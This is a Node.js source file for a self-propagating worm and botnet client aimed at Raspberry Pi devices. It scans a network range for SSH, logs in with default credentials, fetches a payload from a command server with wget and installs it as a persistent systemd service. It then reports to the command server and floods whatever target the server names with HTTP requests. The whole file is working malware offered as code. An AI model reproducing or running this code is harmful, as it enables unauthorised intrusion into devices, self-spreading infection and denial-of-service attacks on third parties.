var os = require('os');
var ifaces = os.networkInterfaces();
var tcPing = require('tcp-ping');
var nodeSsh = require('node-ssh');
var http = require('http');
const ssh = new nodeSsh();
const axios = require('axios').default;

const passwords = [
    "raspberry",
    "password"
]
let ipAddress;
let targetSpecified = false;
let attackInterval;
const commandServer = "169.254.4.72:3030";

/**
 * Attempts to connect to the remote machine to propagate the worm
 * @param {string} ipAddress ipAddress of the target
 */
const attemptConnect = async (ipAddress, localIpAddress) => {
    const password = 'raspberry';
    return new Promise(async (resolve, reject) => {
        try {

            await ssh.connect({
                host: ipAddress,
                port: 22,
                username: 'pi',
                password: password
            });
            const wormDirectory = '/worm';
            const sshOptions = {
                cwd: wormDirectory
            };
            const ls = await ssh.execCommand(`ls ${wormDirectory}`);
            if (ls.stderr) {
                console.log("dne");
                // create worm directory
                await ssh.exec('sudo', ['mkdir', wormDirectory]);

                // get the executable
                const wget = await ssh.execCommand(`sudo wget -O worm.tar.gz ${commandServer}/sendFile`, sshOptions);

                // extract the executable
                await ssh.exec('sudo', ['tar', '-xf', 'worm.tar.gz'], sshOptions);

                // create start script with reference to infectors ip address & move to worm directory
                await ssh.execCommand(`echo "#!/bin/bash\ncd /worm/client\nnode client.js ${localIpAddress}" > start.sh`);
                await ssh.exec('sudo', ['chmod', '755', 'start.sh']);
                await ssh.exec('sudo', ['mv', 'start.sh', wormDirectory]);

                // create a system service to run the executable
                await ssh.execCommand('echo "[Unit]\nDescription=Starts Self Propagating Worm\n\n[Service]\nType=simple\nExecStart=/worm/start.sh\n\n[Install]\nWantedBy=multi-user.target" > worm.service');
                await ssh.execCommand('sudo mv worm.service /etc/systemd/system');

                // enable the executable to start on restarts
                await ssh.execCommand('sudo systemctl daemon-reload');
                await ssh.execCommand('sudo systemctl enable worm');

                // start the executable
                await ssh.execCommand('sudo systemctl start worm');
            }
            ssh.dispose();

            resolve(true);
        } catch (ex) {
            ssh.dispose();
            console.log('attempt connect', ex);
            reject(ex);
        }
    })
}

/**
 * Using tcp-ping package probes the ssh port on the remote machine to see if it is active
 * @param {string} host 
 * @param {number} port 
 */
const checkConnectivity = async (host, port) => {
    return await tcPing.probeAsync(ipAddress, 22);
}

const scan = async (localIpAddress) => {
    const baseIpAddress = "169.254";
    const sshPort = 22;
    const i = 0;
    for (let i = 0; i <= 255; i++) {
        for (let j = 0; j <= 255; j++) {
            ipAddress = `${baseIpAddress}.${i}.${j}`;
            console.log(ipAddress);
            if (ipAddress !== localIpAddress && await checkConnectivity(ipAddress, sshPort)) {
                try {

                    const success = await attemptConnect(ipAddress, localIpAddress);
                } catch (ex) {
                    console.log(ex);
                }
            }
        }
    }
}

/**
 * sends a heartbeat to the command server so it knows this bot is still alive
 */
const heartbeat = async (localIp) => {
    try {
        const heartbeat = await axios.get(`http://${commandServer}/heartbeat/${localIp}`);
        if (!targetSpecified && heartbeat.data !== "No Target") {
            targetSpecified = true;
            attack(heartbeat.data);
        } else if (heartbeat.data === "No Target") {
            targetSpecified = false;
        }
    } catch (ex) {
        console.log('heartbeat', ex);
    }
};

/**
 * Attacks the specified target with a DDOS attack
 * This will probably be extracted into its own file later
 * @param {string} targetIpAddress ip address of the target 
 */
const attack = (targetIpAddress) => {
    console.log('attacking', targetIpAddress);
    this.attackInterval = setInterval(attackTarget, 500, targetIpAddress);
}

const attackTarget = async (targetIpAddress) => {
    console.log('attackTarget', targetIpAddress, targetSpecified);
    attacked = await axios.get(targetIpAddress)
    if (!targetSpecified) {
        clearInterval(this.attackInterval);
    }

}

/**
 * On start sends a post to the command server so it knows the bot is live
 * @param {string} serverAddress The ip address for the command server
 */
const connectToServer = async (localIp, infectedIp) => {
    return new Promise(async (resolve, reject) => {
        try {
            console.log('connecting to server', commandServer);
            const result = await axios.post(`http://${commandServer}/landing`, { ip: localIp, infectedIp: infectedIp });
            resolve(result);
        } catch (ex) {
            console.log(ex);
            reject(ex);
        }
    });
}

const getLocalIp = () => {
    let localIpAddress;
    return new Promise((resolve, reject) => {
        Object.keys(ifaces).forEach(ifname => {
            var alias = 0;

            ifaces[ifname].forEach(iface => {
                if ('IPv4' !== iface.family || iface.internal !== false) {
                    // skip over internal (i.e. 127.0.0.1) and non-ipv4 addresses
                    return;
                } else resolve(iface.address);
            });
        });
    })
}


const startBotnet = async () => {
    if (process.argv.length === 4) {
        ipAddress = process.argv[2];
        localIpAddress = process.argv[3]
        attemptConnect(ipAddress, localIpAddress).catch(ex => { });
    } else if (process.argv.length === 3) {
        const infectedIp = process.argv[2];
        try {
            const localIp = await getLocalIp();
            console.log(localIp);
            await connectToServer(localIp, infectedIp);
            scan(localIp);
            setInterval(heartbeat, 5000, localIp);
        } catch (ex) {
            console.log('start', ex);
        }
    }
}

startBotnet();